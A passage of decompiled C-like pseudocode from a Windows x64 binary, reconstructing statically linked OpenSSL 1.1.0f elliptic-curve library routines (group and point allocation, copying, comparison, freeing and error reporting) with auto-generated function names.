    return 4294967294i64;
  }
  return result;
}

//----- (0000000140021350) ----------------------------------------------------
void __fastcall sub_140021350(__int64 *a1)
{
  void (*v2)(void); // rdx
  __int64 v3; // rcx
  void *v4; // rdi
  void (__fastcall *v5)(__int64); // rdx

  if ( a1 )
  {
    v2 = *(void (**)(void))(*a1 + 24);
    if ( v2 || (v2 = *(void (**)(void))(*a1 + 16)) != 0i64 )
      v2();
    if ( *((_DWORD *)a1 + 38) == 5 )
      sub_14003CB60(a1[20]);
    v3 = a1[18];
    a1[20] = 0i64;
    sub_14003C3A0(v3);
    v4 = (void *)a1[1];
    if ( v4 )
    {
      v5 = *(void (__fastcall **)(__int64))(*(_QWORD *)v4 + 96i64);
      if ( v5 || (v5 = *(void (__fastcall **)(__int64))(*(_QWORD *)v4 + 88i64)) != 0i64 )
        v5(a1[1]);
      sub_14001DA40(v4, 40i64, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 0x252u);
    }
    sub_140026A10((__int64 *)a1[2]);
    sub_140026A10((__int64 *)a1[3]);
    sub_14001DA40((void *)a1[6], a1[7], (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 0x7Eu);
    sub_14001DA40(a1, 168i64, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 0x7Fu);
  }
}

//----- (0000000140021440) ----------------------------------------------------
__int64 __fastcall sub_140021440(__int64 a1, __int64 a2, int *a3)
{
  unsigned int v4; // r14d
  _BYTE *v5; // rdx
  int *v6; // rbx
  __int64 v8; // rbp
  int v10; // eax
  int v11; // ecx
  _QWORD *v12; // r13
  _QWORD *v13; // r12
  __int64 *v14; // r15
  __int64 v15; // rcx
  __int64 *v16; // rdx
  __int64 v17; // rdi
  __int64 *v18; // rsi
  __int64 *v19; // [rsp+70h] [rbp+8h]
  _QWORD *v20; // [rsp+78h] [rbp+10h]
  __int64 *v21; // [rsp+88h] [rbp+20h]

  v4 = 0;
  v5 = *(_BYTE **)a1;
  v6 = a3;
  v8 = 0i64;
  if ( *(_DWORD *)(*(_QWORD *)a1 + 4i64) != *(_DWORD *)(*(_QWORD *)a2 + 4i64) )
    return 1i64;
  v10 = *(_DWORD *)(a1 + 32);
  if ( v10 )
  {
    v11 = *(_DWORD *)(a2 + 32);
    if ( v11 )
    {
      if ( v10 != v11 )
        return 1i64;
    }
  }
  if ( (*v5 & 2) != 0 )
    return 0i64;
  if ( !a3 )
  {
    v6 = (int *)sub_140027CD0();
    v8 = (__int64)v6;
    if ( !v6 )
      return 0xFFFFFFFFi64;
  }
  sub_140027D40(v6);
  v20 = sub_140027C40(v6);
  v12 = sub_140027C40(v6);
  v13 = sub_140027C40(v6);
  v19 = sub_140027C40(v6);
  v21 = sub_140027C40(v6);
  v14 = sub_140027C40(v6);
  if ( !v14 )
    goto LABEL_25;
  if ( (*(unsigned int (__fastcall **)(__int64, _QWORD *, _QWORD *, _QWORD *, int *))(*(_QWORD *)a1 + 48i64))(
         a1,
         v20,
         v12,
         v13,
         v6)
    && (*(unsigned int (__fastcall **)(__int64, __int64 *, __int64 *, __int64 *, int *))(*(_QWORD *)a2 + 48i64))(
         a2,
         v19,
         v21,
         v14,
         v6)
    && !(unsigned int)sub_140026AB0((__int64)v20, v19)
    && !(unsigned int)sub_140026AB0((__int64)v12, v21)
    && !(unsigned int)sub_140026AB0((__int64)v13, v14)
    && !(unsigned int)sub_1400220E0(a1, *(_QWORD **)(a1 + 8), *(_QWORD **)(a2 + 8)) )
  {
    v15 = *(_QWORD *)(a1 + 16);
    v16 = *(__int64 **)(a2 + 16);
    v17 = *(_QWORD *)(a1 + 24);
    v18 = *(__int64 **)(a2 + 24);
    if ( v15 && v16 )
    {
      if ( !(unsigned int)sub_140026AB0(v15, v16) && !(unsigned int)sub_140026AB0(v17, v18) )
        goto LABEL_23;
      goto LABEL_22;
    }
LABEL_25:
    sub_140027B60((__int64)v6);
    sub_140027BE0(v8);
    return 0xFFFFFFFFi64;
  }
LABEL_22:
  v4 = 1;
LABEL_23:
  sub_140027B60((__int64)v6);
  sub_140027BE0(v8);
  return v4;
}

//----- (0000000140021650) ----------------------------------------------------
__int64 __fastcall sub_140021650(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  _DWORD *v5; // rax
  _QWORD *v6; // rax
  void *v7; // rcx
  void *v8; // rax

  if ( !*(_QWORD *)(*(_QWORD *)a1 + 32i64) )
  {
    sub_140024610(16, 106, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 133);
    return 0i64;
  }
  if ( *(_QWORD *)a1 != *(_QWORD *)a2 )
  {
    sub_140024610(16, 106, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 137);
    return 0i64;
  }
  if ( a1 == a2 )
    return 1i64;
  *(_DWORD *)(a1 + 152) = *(_DWORD *)(a2 + 152);
  if ( *(_DWORD *)(a2 + 152) == 5 )
    *(_QWORD *)(a1 + 160) = sub_14003CB20(*(_QWORD *)(a2 + 160));
  else
    *(_QWORD *)(a1 + 160) = 0i64;
  if ( !*(_QWORD *)(a2 + 144) )
  {
    sub_14003C3A0(*(_QWORD *)(a1 + 144));
    *(_QWORD *)(a1 + 144) = 0i64;
    goto LABEL_16;
  }
  if ( !*(_QWORD *)(a1 + 144) )
  {
    v5 = sub_14003C400();
    *(_QWORD *)(a1 + 144) = v5;
    if ( !v5 )
      return 0i64;
  }
  result = sub_14003C310(*(_QWORD *)(a1 + 144), *(_QWORD *)(a2 + 144));
  if ( result )
  {
LABEL_16:
    if ( *(_QWORD *)(a2 + 8) )
    {
      if ( !*(_QWORD *)(a1 + 8) )
      {
        v6 = sub_140022670((__int64 *)a1);
        *(_QWORD *)(a1 + 8) = v6;
        if ( !v6 )
          return 0i64;
      }
      if ( !(unsigned int)sub_140022150(*(_QWORD **)(a1 + 8), *(_QWORD **)(a2 + 8)) )
        return 0i64;
    }
    else
    {
      sub_140022090(*(void **)(a1 + 8));
      *(_QWORD *)(a1 + 8) = 0i64;
    }
    if ( (**(_BYTE **)a2 & 2) != 0
      || sub_140026E90(*(_QWORD *)(a1 + 16), *(_QWORD *)(a2 + 16))
      && sub_140026E90(*(_QWORD *)(a1 + 24), *(_QWORD *)(a2 + 24)) )
    {
      v7 = *(void **)(a1 + 48);
      *(_DWORD *)(a1 + 32) = *(_DWORD *)(a2 + 32);
      *(_DWORD *)(a1 + 36) = *(_DWORD *)(a2 + 36);
      *(_DWORD *)(a1 + 40) = *(_DWORD *)(a2 + 40);
      if ( !*(_QWORD *)(a2 + 48) )
      {
        sub_14001D930(v7);
        *(_QWORD *)(a1 + 48) = 0i64;
        *(_QWORD *)(a1 + 56) = 0i64;
        return (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + 32i64))(a1, a2);
      }
      sub_14001D930(v7);
      v8 = sub_14001D8E0(*(_QWORD *)(a2 + 56));
      *(_QWORD *)(a1 + 48) = v8;
      if ( v8 )
      {
        memmove(v8, *(const void **)(a2 + 48), *(_QWORD *)(a2 + 56));
        *(_QWORD *)(a1 + 56) = *(_QWORD *)(a2 + 56);
        return (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + 32i64))(a1, a2);
      }
    }
    return 0i64;
  }
  return result;
}

//----- (00000001400218A0) ----------------------------------------------------
__int64 *__fastcall sub_1400218A0(__int64 *a1)
{
  __int64 *v3; // rax
  __int64 *v4; // rbx

  if ( !a1 )
    return 0i64;
  v3 = sub_140021BE0(*a1);
  v4 = v3;
  if ( !v3 )
    return 0i64;
  if ( !(unsigned int)sub_140021650((__int64)v3, (__int64)a1) )
  {
    sub_140021910(v4);
    return 0i64;
  }
  return v4;
}

//----- (0000000140021910) ----------------------------------------------------
void __fastcall sub_140021910(__int64 *a1)
{
  void (*v2)(void); // rdx
  __int64 v3; // rcx
  void *v4; // rdi
  void (__fastcall *v5)(__int64); // rdx

  if ( a1 )
  {
    v2 = *(void (**)(void))(*a1 + 16);
    if ( v2 )
      v2();
    if ( *((_DWORD *)a1 + 38) == 5 )
      sub_14003CB60(a1[20]);
    v3 = a1[18];
    a1[20] = 0i64;
    sub_14003C3A0(v3);
    v4 = (void *)a1[1];
    if ( v4 )
    {
      v5 = *(void (__fastcall **)(__int64))(*(_QWORD *)v4 + 88i64);
      if ( v5 )
        v5(a1[1]);
      sub_14001D930(v4);
    }
    sub_140026FF0((_DWORD *)a1[2]);
    sub_140026FF0((_DWORD *)a1[3]);
    sub_14001D930((void *)a1[6]);
    sub_14001D930(a1);
  }
}

//----- (0000000140021A00) ----------------------------------------------------
__int64 __fastcall sub_140021A00(__int64 a1)
{
  return *(unsigned int *)(a1 + 36);
}

//----- (0000000140021A10) ----------------------------------------------------
_BOOL8 __fastcall sub_140021A10(__int64 a1, __int64 a2)
{
  __int64 v4; // rdx

  v4 = *(_QWORD *)(a1 + 24);
  return v4 && sub_140026E90(a2, v4) && !sub_140027160(*(_QWORD *)(a1 + 24));
}

//----- (0000000140021A60) ----------------------------------------------------
__int64 __fastcall sub_140021A60(__int64 a1)
{
  __int64 (*v1)(void); // r10

  v1 = *(__int64 (**)(void))(*(_QWORD *)a1 + 48i64);
  if ( v1 )
    return v1();
  sub_140024610(16, 172, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 445);
  return 0i64;
}

//----- (0000000140021AB0) ----------------------------------------------------
__int64 __fastcall sub_140021AB0(__int64 a1)
{
  __int64 (*v1)(void); // r10

  v1 = *(__int64 (**)(void))(*(_QWORD *)a1 + 48i64);
  if ( v1 )
    return v1();
  sub_140024610(16, 130, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 422);
  return 0i64;
}

//----- (0000000140021B00) ----------------------------------------------------
__int64 __fastcall sub_140021B00(__int64 a1)
{
  return *(unsigned int *)(a1 + 32);
}

//----- (0000000140021B10) ----------------------------------------------------
__int64 __fastcall sub_140021B10(__int64 a1)
{
  __int64 (*v1)(void); // rdx

  v1 = *(__int64 (**)(void))(*(_QWORD *)a1 + 56i64);
  if ( v1 )
    return v1();
  sub_140024610(16, 173, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 455);
  return 0i64;
}

//----- (0000000140021B60) ----------------------------------------------------
__int64 __fastcall sub_140021B60(__int64 a1)
{
  return *(_QWORD *)(a1 + 144);
}

//----- (0000000140021B70) ----------------------------------------------------
__int64 __fastcall sub_140021B70(__int64 a1)
{
  return *(unsigned int *)(a1 + 40);
}

//----- (0000000140021B80) ----------------------------------------------------
__int64 __fastcall sub_140021B80(__int64 a1)
{
  return *(_QWORD *)(a1 + 56);
}

//----- (0000000140021B90) ----------------------------------------------------
__int64 __fastcall sub_140021B90(__int64 a1)
{
  __int64 (*v2)(void); // rdx

  if ( !*(_QWORD *)(*(_QWORD *)a1 + 240i64) )
    return sub_14003CD00(a1);
  v2 = *(__int64 (**)(void))(*(_QWORD *)a1 + 256i64);
  if ( v2 )
    return v2();
  else
    return 0i64;
}

//----- (0000000140021BD0) ----------------------------------------------------
__int64 __fastcall sub_140021BD0(__int64 a1)
{
  return *(_QWORD *)a1;
}

//----- (0000000140021BE0) ----------------------------------------------------
_QWORD *__fastcall sub_140021BE0(__int64 a1)
{
  int v1; // eax
  _QWORD *v4; // rax
  _QWORD *v5; // rbx
  _DWORD *v6; // rax
  _DWORD *v7; // rax

  if ( a1 )
  {
    if ( *(_QWORD *)(a1 + 8) )
    {
      v4 = sub_14001DC20(0xA8ui64);
      v5 = v4;
      if ( v4 )
      {
        *v4 = a1;
        if ( ((*(_BYTE *)a1 & 2) != 0
           || (v6 = sub_140027200(), (v5[2] = v6) != 0i64) && (v7 = sub_140027200(), (v5[3] = v7) != 0i64))
          && (*((_DWORD *)v5 + 9) = 1, *((_DWORD *)v5 + 10) = 4, (*(unsigned int (__fastcall **)(_QWORD *))(a1 + 8))(v5)) )
        {
          return v5;
        }
        else
        {
          sub_140026FF0((_DWORD *)v5[2]);
          sub_140026FF0((_DWORD *)v5[3]);
          sub_14001D930(v5);
          return 0i64;
        }
      }
      else
      {
        sub_140024610(16, 108, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 40);
        return 0i64;
      }
    }
    else
    {
      sub_140024610(16, 108, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 34);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(v1 - 32, 108, 108, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 30);
    return 0i64;
  }
}
// 140021C0E: variable 'v1' is possibly undefined

//----- (0000000140021D20) ----------------------------------------------------
__int64 __fastcall sub_140021D20(__int64 a1)
{
  if ( !*(_QWORD *)(*(_QWORD *)a1 + 64i64) )
    sub_1400234A0(
      "assertion failed: group->meth->group_order_bits != NULL",
      "..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c",
      328i64);
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 64i64))(a1);
}

//----- (0000000140021D70) ----------------------------------------------------
void __fastcall sub_140021D70(__int64 a1, int a2)
{
  *(_DWORD *)(a1 + 36) = a2;
}

//----- (0000000140021D80) ----------------------------------------------------
__int64 __fastcall sub_140021D80(__int64 a1)
{
  __int64 (*v1)(void); // r10

  v1 = *(__int64 (**)(void))(*(_QWORD *)a1 + 40i64);
  if ( v1 )
    return v1();
  sub_140024610(16, 176, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 434);
  return 0i64;
}

//----- (0000000140021DD0) ----------------------------------------------------
__int64 __fastcall sub_140021DD0(__int64 a1)
{
  __int64 (*v1)(void); // r10

  v1 = *(__int64 (**)(void))(*(_QWORD *)a1 + 40i64);
  if ( v1 )
    return v1();
  sub_140024610(16, 109, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 412);
  return 0i64;
}

//----- (0000000140021E20) ----------------------------------------------------
void __fastcall sub_140021E20(__int64 a1, int a2)
{
  *(_DWORD *)(a1 + 32) = a2;
}

//----- (0000000140021E30) ----------------------------------------------------
__int64 __fastcall sub_140021E30(__int64 *a1, _QWORD *a2, __int64 a3, __int64 a4)
{
  int v4; // eax
  __int64 result; // rax
  _QWORD *v10; // rax
  __int64 v11; // rcx
  __int64 v12; // rcx

  if ( !a2 )
  {
    sub_140024610(v4 - 32, v4 + 63, v4 + 19, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 263);
    return 0i64;
  }
  if ( !a1[1] )
  {
    v10 = sub_140022670(a1);
    a1[1] = (__int64)v10;
    if ( !v10 )
      return 0i64;
  }
  if ( !(unsigned int)sub_140022150((_QWORD *)a1[1], a2) )
    return 0i64;
  v11 = a1[2];
  if ( a3 )
  {
    result = (__int64)sub_140026E90(v11, a3);
    if ( !result )
      return result;
  }
  else
  {
    sub_140027560(v11, 0i64);
  }
  v12 = a1[3];
  if ( a4 )
  {
    result = (__int64)sub_140026E90(v12, a4);
    if ( !result )
      return result;
  }
  else
  {
    sub_140027560(v12, 0i64);
  }
  if ( sub_1400270F0(a1[2]) )
    return sub_140022B90((__int64)a1);
  sub_14003C3A0(a1[18]);
  result = 1i64;
  a1[18] = 0i64;
  return result;
}
// 140021E70: variable 'v4' is possibly undefined

//----- (0000000140021F30) ----------------------------------------------------
void __fastcall sub_140021F30(__int64 a1, int a2)
{
  *(_DWORD *)(a1 + 40) = a2;
}

//----- (0000000140021F40) ----------------------------------------------------
__int64 __fastcall sub_140021F40(__int64 a1, const void *a2, size_t a3)
{
  __int64 result; // rax

  sub_14001D930(*(void **)(a1 + 48));
  *(_QWORD *)(a1 + 48) = 0i64;
  *(_QWORD *)(a1 + 56) = 0i64;
  if ( !a3 || !a2 )
    return 1i64;
  result = (__int64)sub_14001D8E0(a3);
  *(_QWORD *)(a1 + 48) = result;
  if ( result )
  {
    memmove((void *)result, a2, a3);
    result = a3;
    *(_QWORD *)(a1 + 56) = a3;
  }
  return result;
}

//----- (0000000140022000) ----------------------------------------------------
__int64 __fastcall sub_140022000(__int64 a1)
{
  return *(unsigned int *)(a1 + 4);
}

//----- (0000000140022010) ----------------------------------------------------
__int64 __fastcall sub_140022010(__int64 a1, _QWORD *a2, _QWORD *a3, _QWORD *a4)
{
  __int64 (__fastcall *v4)(__int64); // r11

  v4 = *(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 176i64);
  if ( v4 )
  {
    if ( *(_QWORD *)a1 == *a2 && *a2 == *a3 && *a3 == *a4 )
      return v4(a1);
    sub_140024610(16, 112, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 785);
  }
  else
  {
    sub_140024610(16, 112, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 780);
  }
  return 0i64;
}

//----- (0000000140022090) ----------------------------------------------------
void __fastcall sub_140022090(void *a1)
{
  void (*v2)(void); // rdx

  if ( a1 )
  {
    v2 = *(void (**)(void))(*(_QWORD *)a1 + 96i64);
    if ( v2 || (v2 = *(void (**)(void))(*(_QWORD *)a1 + 88i64)) != 0i64 )
      v2();
    sub_14001DA40(a1, 40i64, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 0x252u);
  }
}

//----- (00000001400220E0) ----------------------------------------------------
__int64 __fastcall sub_1400220E0(__int64 a1, _QWORD *a2, _QWORD *a3)
{
  __int16 v3; // ax
  __int64 (*v4)(void); // r11

  v4 = *(__int64 (**)(void))(*(_QWORD *)a1 + 216i64);
  if ( v4 )
  {
    if ( *(_QWORD *)a1 == *a2 && *a2 == *a3 )
      return v4();
    sub_140024610(16, 113, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 861);
  }
  else
  {
    sub_140024610(16, 113, v3 + 10, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 857);
  }
  return 0xFFFFFFFFi64;
}
// 140022104: variable 'v3' is possibly undefined

//----- (0000000140022150) ----------------------------------------------------
__int64 __fastcall sub_140022150(_QWORD *a1, _QWORD *a2)
{
  __int64 (*v2)(void); // r8

  v2 = *(__int64 (**)(void))(*a1 + 104i64);
  if ( v2 )
  {
    if ( *a1 == *a2 )
    {
      if ( a1 == a2 )
        return 1i64;
      else
        return v2();
    }
    else
    {
      sub_140024610(16, 114, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 604);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(16, 114, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 600);
    return 0i64;
  }
}

//----- (00000001400221E0) ----------------------------------------------------
__int64 __fastcall sub_1400221E0(__int64 a1, _QWORD *a2, _QWORD *a3)
{
  __int16 v3; // ax
  __int64 (*v4)(void); // r11

  v4 = *(__int64 (**)(void))(*(_QWORD *)a1 + 184i64);
  if ( v4 )
  {
    if ( *(_QWORD *)a1 == *a2 && *a2 == *a3 )
      return v4();
    sub_140024610(16, 115, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 799);
  }
  else
  {
    sub_140024610(16, 115, v3 + 10, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 795);
  }
  return 0i64;
}
// 140022204: variable 'v3' is possibly undefined

//----- (0000000140022250) ----------------------------------------------------
void *__fastcall sub_140022250(_QWORD *a1, __int64 *a2)
{
  _QWORD *v4; // rax
  void *v5; // rbx

  if ( !a1 )
    return 0i64;
  v4 = sub_140022670(a2);
  v5 = v4;
  if ( !v4 )
    return 0i64;
  if ( !(unsigned int)sub_140022150(v4, a1) )
  {
    sub_1400222C0(v5);
    return 0i64;
  }
  return v5;
}

//----- (00000001400222C0) ----------------------------------------------------
void __fastcall sub_1400222C0(void *a1)
{
  void (*v2)(void); // rdx

  if ( a1 )
  {
    v2 = *(void (**)(void))(*(_QWORD *)a1 + 88i64);
    if ( v2 )
      v2();
    sub_14001D930(a1);
  }
}

//----- (0000000140022300) ----------------------------------------------------
__int64 __fastcall sub_140022300(__int64 a1, _QWORD *a2)
{
  __int64 (*v2)(void); // r10

  v2 = *(__int64 (**)(void))(*(_QWORD *)a1 + 144i64);
  if ( v2 )
  {
    if ( *(_QWORD *)a1 == *a2 )
    {
      return v2();
    }
    else
    {
      sub_140024610(16, 183, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 769);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(16, 183, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 764);
    return 0i64;
  }
}

//----- (0000000140022380) ----------------------------------------------------
__int64 __fastcall sub_140022380(__int64 a1, _QWORD *a2)
{
  __int64 (*v2)(void); // r10

  v2 = *(__int64 (**)(void))(*(_QWORD *)a1 + 144i64);
  if ( v2 )
  {
    if ( *(_QWORD *)a1 == *a2 )
    {
      return v2();
    }
    else
    {
      sub_140024610(16, 116, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 751);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(16, 116, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 746);
    return 0i64;
  }
}

//----- (0000000140022400) ----------------------------------------------------
__int64 __fastcall sub_140022400(__int64 a1, _QWORD *a2)
{
  __int64 (*v2)(void); // r9

  v2 = *(__int64 (**)(void))(*(_QWORD *)a1 + 192i64);
  if ( v2 )
  {
    if ( *(_QWORD *)a1 == *a2 )
    {
      return v2();
    }
    else
    {
      sub_140024610(16, 210, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 812);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(16, 210, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 808);
    return 0i64;
  }
}

//----- (0000000140022480) ----------------------------------------------------
__int64 __fastcall sub_140022480(__int64 a1, _QWORD *a2)
{
  __int64 (*v2)(void); // r8

  v2 = *(__int64 (**)(void))(*(_QWORD *)a1 + 200i64);
  if ( v2 )
  {
    if ( *(_QWORD *)a1 == *a2 )
    {
      return v2();
    }
    else
    {
      sub_140024610(16, 118, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 826);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(16, 118, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 822);
    return 0i64;
  }
}

//----- (0000000140022500) ----------------------------------------------------
__int64 __fastcall sub_140022500(__int64 a1, _QWORD *a2)
{
  __int64 (*v2)(void); // r9

  v2 = *(__int64 (**)(void))(*(_QWORD *)a1 + 208i64);
  if ( v2 )
  {
    if ( *(_QWORD *)a1 == *a2 )
    {
      return v2();
    }
    else
    {
      sub_140024610(16, 119, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 847);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(16, 119, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 843);
    return 0i64;
  }
}

//----- (0000000140022580) ----------------------------------------------------
__int64 __fastcall sub_140022580(__int64 a1, _QWORD *a2)
{
  __int64 (*v2)(void); // r9

  v2 = *(__int64 (**)(void))(*(_QWORD *)a1 + 224i64);
  if ( v2 )
  {
    if ( *(_QWORD *)a1 == *a2 )
    {
      return v2();
    }
    else
    {
      sub_140024610(16, 120, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 874);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(16, 120, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 870);
    return 0i64;
  }
}

//----- (0000000140022600) ----------------------------------------------------
__int64 __fastcall sub_140022600(
        __FrameHandler3::TryBlockMap *a1,
        _QWORD *a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        __int64 a6)
{
  _BOOL8 v6; // r9
  __int64 (__fastcall *v7)(__FrameHandler3::TryBlockMap *, _QWORD *, __int64, _BOOL8, __int64 *, __int64 *, __int64); // r10
  __int64 v9; // [rsp+50h] [rbp+8h] BYREF

  v9 = a4;
  v6 = a4 && a5;
  v7 = *(__int64 (__fastcall **)(__FrameHandler3::TryBlockMap *, _QWORD *, __int64, _BOOL8, __int64 *, __int64 *, __int64))(*(_QWORD *)a1 + 240i64);
  if ( v7 )
    return v7(a1, a2, a3, v6, &v9, &a5, a6);
  else
    return sub_14003CD20(a1, a2, a3, v6, (__int64)&v9, &a5, a6);
}

//----- (0000000140022670) ----------------------------------------------------
_QWORD *__fastcall sub_140022670(__int64 *a1)
{
  int v1; // eax
  _QWORD *v4; // rbx
  __int64 v5; // rax

  if ( a1 )
  {
    if ( *(_QWORD *)(*a1 + 80) )
    {
      v4 = sub_14001DC20(0x28ui64);
      if ( v4 )
      {
        v5 = *a1;
        *v4 = *a1;
        if ( (*(unsigned int (__fastcall **)(_QWORD *))(v5 + 80))(v4) )
        {
          return v4;
        }
        else
        {
          sub_14001D930(v4);
          return 0i64;
        }
      }
      else
      {
        sub_140024610(16, 121, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 561);
        return 0i64;
      }
    }
    else
    {
      sub_140024610(16, 121, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 555);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(v1 - 32, v1 + 73, v1 + 19, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 551);
    return 0i64;
  }
}
// 140022699: variable 'v1' is possibly undefined

//----- (0000000140022770) ----------------------------------------------------
__int64 __fastcall sub_140022770(__int64 a1, _QWORD *a2)
{
  __int64 (*v2)(void); // r10

  v2 = *(__int64 (**)(void))(*(_QWORD *)a1 + 120i64);
  if ( v2 )
  {
    if ( *(_QWORD *)a1 == *a2 )
    {
      return v2();
    }
    else
    {
      sub_140024610(16, 126, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 662);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(16, 126, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 657);
    return 0i64;
  }
}

//----- (00000001400227F0) ----------------------------------------------------
__int64 __fastcall sub_1400227F0(__int64 a1, _QWORD *a2)
{
  unsigned int (__fastcall *v4)(__int64); // r10

  v4 = *(unsigned int (__fastcall **)(__int64))(*(_QWORD *)a1 + 136i64);
  if ( !v4 )
  {
    sub_140024610(16, 185, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 720);
    return 0i64;
  }
  if ( *(_QWORD *)a1 != *a2 )
  {
    sub_140024610(16, 185, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 725);
    return 0i64;
  }
  if ( !v4(a1) )
    return 0i64;
  if ( (int)sub_140022500(a1, a2) <= 0 )
  {
    sub_140024610(16, 185, 107, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 733);
    return 0i64;
  }
  return 1i64;
}

//----- (00000001400228F0) ----------------------------------------------------
__int64 __fastcall sub_1400228F0(__int64 a1, _QWORD *a2)
{
  unsigned int (__fastcall *v4)(__int64); // r10

  v4 = *(unsigned int (__fastcall **)(__int64))(*(_QWORD *)a1 + 136i64);
  if ( !v4 )
  {
    sub_140024610(16, 124, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 694);
    return 0i64;
  }
  if ( *(_QWORD *)a1 != *a2 )
  {
    sub_140024610(16, 124, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 699);
    return 0i64;
  }
  if ( !v4(a1) )
    return 0i64;
  if ( (int)sub_140022500(a1, a2) <= 0 )
  {
    sub_140024610(16, 124, 107, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 707);
    return 0i64;
  }
  return 1i64;
}

//----- (00000001400229F0) ----------------------------------------------------
__int64 __fastcall sub_1400229F0(__int64 a1, _QWORD *a2)
{
  __int64 (*v2)(void); // r8

  v2 = *(__int64 (**)(void))(*(_QWORD *)a1 + 112i64);
  if ( v2 )
  {
    if ( *(_QWORD *)a1 == *a2 )
    {
      return v2();
    }
    else
    {
      sub_140024610(16, 127, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 644);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(16, 127, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 640);
    return 0i64;
  }
}

//----- (0000000140022A70) ----------------------------------------------------
__int64 __fastcall sub_140022A70(__int64 *a1, unsigned __int64 a2, __int64 a3)
{
  int v3; // eax
  __int64 v4; // r10
  __int64 (__fastcall *v6)(__int64 *); // rbx
  __int64 v8; // rcx

  v4 = *a1;
  v6 = *(__int64 (__fastcall **)(__int64 *))(*a1 + 232);
  if ( v6 )
  {
    v8 = 0i64;
    if ( a2 )
    {
      while ( v4 == **(_QWORD **)(a3 + 8 * v8) )
      {
        if ( ++v8 >= a2 )
          return v6(a1);
      }
      sub_140024610(16, 136, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_lib.c", 891);
      return 0i64;
    }
    else
    {
      return v6(a1);
    }
  }
  else
  {
